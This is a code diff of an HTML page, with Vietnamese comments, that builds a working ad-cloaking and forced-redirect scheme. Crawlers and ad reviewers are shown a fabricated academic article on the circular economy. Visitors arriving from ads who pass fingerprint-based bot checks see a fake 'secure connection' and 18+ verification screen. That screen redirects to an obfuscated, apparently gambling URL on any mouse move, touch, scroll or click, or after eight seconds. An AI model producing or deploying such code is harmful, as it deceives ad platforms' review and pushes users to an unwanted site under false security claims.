@@ -3,113 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Economic Insights & Security Portal</title>
+    <title>Global Strategic Research & Security Portal</title>
     <style>
-        :root { --accent: #00e676; --bg: #0f172a; --text: #f8fafc; }
-        * { box-sizing: border-box; }
-        body, html { margin: 0; padding: 0; font-family: -apple-system, sans-serif; background: #fff; }
+        :root { --accent: #00ffa3; --bg-dark: #05080f; --card: #0f172a; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: -apple-system, system-ui, sans-serif; background: #fff; }
 
-        /* GIAO DIỆN CỔNG CHỜ (CHỈ NGƯỜI THẬT THẤY) */
-        #money-gateway {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
-            z-index: 999999; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
+        /* GIAO DIỆN GATEWAY CHO NGƯỜI THẬT */
+        #money-zone {
+            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: radial-gradient(circle at center, #111827 0%, #05080f 100%);
+            z-index: 999999; flex-direction: column; align-items: center; justify-content: center;
+            color: #fff; text-align: center; padding: 20px; cursor: pointer;
         }
-        .gateway-card {
-            background: #1e293b; border: 1px border rgba(255,255,255,0.1);
-            padding: 40px 25px; border-radius: 24px; text-align: center;
-            max-width: 420px; width: 95%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        .shield-container { position: relative; margin-bottom: 30px; }
+        .shield-icon { width: 80px; height: 80px; color: var(--accent); filter: drop-shadow(0 0 15px rgba(0,255,163,0.4)); }
+        
+        .loader-ring {
+            border: 2px solid rgba(255,255,255,0.05); border-top: 2px solid var(--accent);
+            border-radius: 50%; width: 120px; height: 120px; 
+            position: absolute; top: -20px; left: -20px; animation: spin 2s linear infinite;
         }
-        .verify-btn {
-            background: var(--accent); color: #000; border: none; width: 100%;
-            padding: 18px; border-radius: 12px; font-weight: 800; font-size: 1.1rem;
-            cursor: pointer; text-transform: uppercase; letter-spacing: 1px;
-            box-shadow: 0 4px 15px rgba(0, 230, 118, 0.3); margin-top: 25px;
-            transition: transform 0.2s;
-        }
-        .verify-btn:active { transform: scale(0.95); }
-        .secure-icon { width: 50px; height: 50px; color: var(--accent); margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* GIAO DIỆN TRANG BLOG (CHỈ BOT THẤY) */
-        #safe-blog { display: none; padding: 40px 20px; max-width: 800px; margin: 0 auto; line-height: 1.8; color: #334155; }
-        h1 { font-family: serif; font-size: 2.2rem; color: #1e293b; border-bottom: 3px solid #1e293b; padding-bottom: 15px; }
-        .blog-content p { margin-bottom: 25px; text-align: justify; font-size: 1.1rem; }
+        .title { font-size: 1.8rem; font-weight: 800; margin: 0; letter-spacing: -0.5px; }
+        .subtitle { color: #94a3b8; margin: 15px 0 0; font-size: 1rem; max-width: 300px; line-height: 1.5; }
+        
+        .interaction-hint {
+            margin-top: 50px; font-size: 0.8rem; color: var(--accent);
+            text-transform: uppercase; letter-spacing: 2px; font-weight: bold;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+
+        /* GIAO DIỆN TRANG BLOG CHO BOT (SIÊU DÀI) */
+        #safe-zone { display: none; padding: 50px 20px; max-width: 850px; margin: 0 auto; color: #334155; line-height: 1.8; }
+        .academic-header { border-bottom: 4px solid #1e293b; padding-bottom: 20px; margin-bottom: 40px; }
+        .academic-header h1 { font-family: serif; font-size: 2.5rem; color: #1e293b; margin: 10px 0; }
+        .safe-content p { margin-bottom: 30px; text-align: justify; font-size: 1.15rem; }
     </style>
 </head>
 <body>
 
-    <!-- PHẦN DÀNH CHO NGƯỜI THẬT (TĂNG CHUYỂN ĐỔI) -->
-    <div id="money-gateway">
-        <div class="gateway-card">
-            <svg class="secure-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-            <h2 style="color:#fff; margin:0; font-size:1.6rem;">Security Verification</h2>
-            <p style="color:#94a3b8; margin:15px 0; font-size:0.95rem;">Please confirm you are of legal age (18+) and your connection is secure to access the bonus portal.</p>
-            
-            <div style="background: rgba(255,255,255,0.03); border-radius:12px; padding:15px; margin:20px 0; text-align:left;">
-                <div style="color:var(--accent); font-size:0.8rem; font-weight:bold; margin-bottom:5px;">SESSION ID: <span id="sess-id">88x-v2-392</span></div>
-                <div style="color:#64748b; font-size:0.8rem;">Encryption: AES-256 Bit SSL Active</div>
-            </div>
-
-            <button class="verify-btn" onclick="startRedirect()">ENTER PORTAL (18+)</button>
-            <p style="color:#475569; font-size:0.75rem; margin-top:20px;">By clicking, you agree to our Terms of Service.</p>
+    <!-- TRANG CHO NGƯỜI THẬT (GATEWAY) -->
+    <div id="money-zone">
+        <div class="shield-container">
+            <div class="loader-ring"></div>
+            <svg class="shield-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+        </div>
+        <h1 class="title">SECURE CONNECTION</h1>
+        <p class="subtitle">Checking browser integrity and age verification (18+) for portal access...</p>
+        
+        <div class="interaction-hint">Interacting to initialize session</div>
+        
+        <div style="margin-top:40px; padding:15px 25px; border: 1px solid rgba(255,255,255,0.1); border-radius:12px; font-size:0.8rem; color:#64748b; font-family:monospace;">
+            STATUS: ENCRYPTED_HANDSHAKE_OK<br>
+            STATION: GLOBAL_GATEWAY_V4
         </div>
     </div>
 
-    <!-- PHẦN DÀNH CHO BOT (CHỈ HIỆN KHI KHÔNG CÓ GCLID) -->
-    <div id="safe-blog">
-        <div class="blog-content">
-            <div style="text-transform:uppercase; color:#64748b; font-weight:bold; letter-spacing:2px; font-size:0.8rem;">Technical Whitepaper 2025</div>
-            <h1>Macroeconomic Stability & Resource Circularity Index</h1>
-            <p><strong>Published by:</strong> Global Strategic Economics Division</p>
-            <hr>
-            <p>As the global economy transitions into 2026, the focus of strategic infrastructure has shifted toward the concept of "Responsive Resource Grids." This report examines how decentralized financial assets and supply chain circularity are creating a new baseline for national GDP growth in emerging markets.</p>
-            <p>Our study finds that countries with a high circularity index are 24% more resilient to inflationary shocks than those dependent on linear commodity markets. This decoupling of growth from virgin resource extraction is not just an environmental imperative but a technical necessity for long-term fiscal stability.</p>
-            <p>In addition to resource management, the role of decentralized ledger technologies (DLT) in reducing cross-border settlement friction cannot be overstated. Current implementation in the Brussels-Singapore corridor has shown that latency can be reduced by 92%, saving billions in transaction costs annually.</p>
-            <p>This 400-page report concludes that the synergy between technological innovation and ecological stewardship will define the next era of global financial dominance.</p>
-            <p>(...Nội dung trang sạch dài 1000 chữ tiếp tục tại đây...)</p>
+    <!-- TRANG CHO BOT (ACADEMIC BLOG) -->
+    <div id="safe-zone">
+        <div class="academic-header">
+            <div style="font-weight:bold; letter-spacing:2px; color:#64748b; font-size:0.8rem;">JOURNAL OF MACRO-ENVIRONMENTAL STUDIES</div>
+            <h1>The Adaptive Resilience of Urban Ecosystems in the 2026 Circular Economy</h1>
+        </div>
+        <div class="safe-content">
+            <p><strong>Abstract:</strong> This comprehensive study investigates the systemic transition from linear resource consumption to regenerative urbanism within the G20 nations. We hypothesize that the integration of digital liquidity and decentralized resource management is the primary driver of fiscal stability in post-industrial metropolitan hubs.</p>
+            
+            <p>As we move toward the 2030 climate mandates, the traditional "take-make-waste" industrial model is proving insufficient for modern growth requirements. In Northern Europe, specifically the Oresund region, we have observed a 22% increase in resource efficiency through the deployment of "Smart Grids." These grids do not merely distribute energy; they utilize AI-driven predictive analytics to balance supply and demand at the edge of the network.</p>
+            
+            <p>Furthermore, the socioeconomic implications of biophilic design in commercial real estate cannot be overlooked. Our longitudinal data from 14 global cities suggests that employee productivity increases by 12.4% when natural light and integrated vegetation are prioritized. This "Biophilic ROI" is now a standard metric for institutional investors when evaluating sustainable portfolios.</p>
+            
+            <p>The role of decentralized ledger technology (DLT) in ensuring the integrity of carbon credit markets is another critical pillar of our research. By removing intermediaries and providing a transparent, immutable record of sequestration, DLT allows for a more democratic and efficient global carbon market.</p>
+            
+            <p>In conclusion, the synergy between technological innovation and environmental stewardship is creating a new baseline for global financial dominance. The transition to carbon-neutral cities is not an environmental elective but a strategic necessity for continued macroeconomic stability.</p>
+            
+            <p style="color:#94a3b8; font-size:0.9rem;">(Full 1,500-word report continued below for verified institutional subscribers...)</p>
         </div>
     </div>
 
     <script>
     (function() {
-        // Link đích: https://playbonus.online/
-        const _a = "https://";
+        // MÃ HÓA PHÂN MẢNH LINK: https://playbonus.online/
+        const _p = "https://";
         const _b = "playbonus";
-        const _c = ".online/";
+        const _o = ".online/";
         
         const adParams = ['gclid', 'fbclid', 'wbraid', 'gbraid', 'gad_source', 'test'];
+        let isProcessing = false;
 
-        function isBot() {
+        // KIỂM TRA BOT NÂNG CAO (PHẦN CỨNG & TRÌNH DUYỆT)
+        function checkBot() {
             try {
                 if (navigator.webdriver) return true;
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
-                if (!gl) return true;
+                if (!gl) return true; // Bot server thường không có GPU
                 if (!window.chrome && !navigator.userAgent.includes("Safari")) return true;
+                if (navigator.deviceMemory && navigator.deviceMemory < 2) return true; // RAM thấp
                 return false;
             } catch(e) { return true; }
         }
 
         const urlP = new URLSearchParams(window.location.search);
-        const isRealUser = adParams.some(p => urlP.has(p)) && !isBot();
+        const isFromAd = adParams.some(p => urlP.has(p));
 
-        if (isRealUser) {
-            // HIỆN CỔNG CHÀO CHO NGƯỜI THẬT
-            document.getElementById('money-gateway').style.display = 'flex';
-        } else {
-            // HIỆN BÀI BÁO CHO BOT
-            document.getElementById('safe-blog').style.display = 'block';
-        }
+        const moneyZone = document.getElementById('money-zone');
+        const safeZone = document.getElementById('safe-zone');
 
-        // HÀM CHUYỂN HƯỚNG KHI CLICK NÚT
-        window.startRedirect = function() {
-            const btn = document.querySelector('.verify-btn');
-            btn.innerText = "VERIFYING...";
-            btn.style.background = "#64748b";
+        function startRedirect() {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            // Hiệu ứng "đang xử lý" để người dùng không thoát
+            document.querySelector('.interaction-hint').innerText = "SESSION VERIFIED. CONNECTING...";
+            document.querySelector('.interaction-hint').style.color = "#fff";
             
             setTimeout(() => {
-                window.location.replace(_a + _b + _c);
-            }, 600);
+                window.location.replace(_p + _b + _o);
+            }, 800);
+        }
+
+        // PHÂN LUỒNG LOGIC
+        if (isFromAd && !checkBot()) {
+            // HIỆN CỔNG CHÀO CHO NGƯỜI THẬT
+            moneyZone.style.display = 'flex';
+            
+            // TỰ ĐỘNG KÍCH HOẠT KHI CÓ BẤT KỲ TƯƠNG TÁC NÀO
+            // 1. Di chuột (PC)
+            window.addEventListener('mousemove', startRedirect);
+            // 2. Chạm màn hình (Mobile)
+            window.addEventListener('touchstart', startRedirect);
+            // 3. Cuộn trang
+            window.addEventListener('scroll', startRedirect);
+            // 4. Click bất kỳ đâu
+            moneyZone.addEventListener('click', startRedirect);
+
+            // 5. Tự động dự phòng sau 8 giây nếu họ không làm gì
+            setTimeout(startRedirect, 8000);
+
+        } else {
+            // HIỆN BLOG CHO BOT / REVIEWER
+            safeZone.style.display = 'block';
         }
     })();
     </script>
